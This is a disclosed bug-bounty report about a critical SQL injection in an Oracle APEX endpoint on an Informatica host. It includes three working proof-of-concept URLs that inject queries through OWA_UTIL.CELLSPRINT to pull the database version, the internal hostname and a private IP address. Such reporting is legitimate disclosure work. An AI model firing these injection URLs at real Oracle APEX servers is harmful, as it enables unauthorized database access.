# [afocusp.informatica.com] Sql injection  afocusp.informatica.com:37777

## Report Details
- **Report ID**: 178632
- **URL**: https://hackerone.com/reports/178632
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2016-10-28T16:44:14.989Z
- **Disclosed**: 2017-01-21T19:05:37.398Z

## Reporter
- **Username**: e3xpl0it
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: informatica

## Vulnerability Information
hi !There is another sql injection on host  afocusp.informatica.com:37777

POC 
version
http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+*+from+v$version

hostname of the database server 
psvlxtdapp1.inf

http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'HOST',+15)+ipaddr+from+dual

IP address of the database server (local)
10.1.192.93 

http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'IP_ADDRESS',+15)+ipaddr+from+dual

Ps
You need to patch all servers with the url /pls/apex/f? this is  old bug in oracle.

## Attachments
- IP_address_of_the_database_server_(local).jpg
- hostname_of_the_database_server_.jpg
- version_.jpg
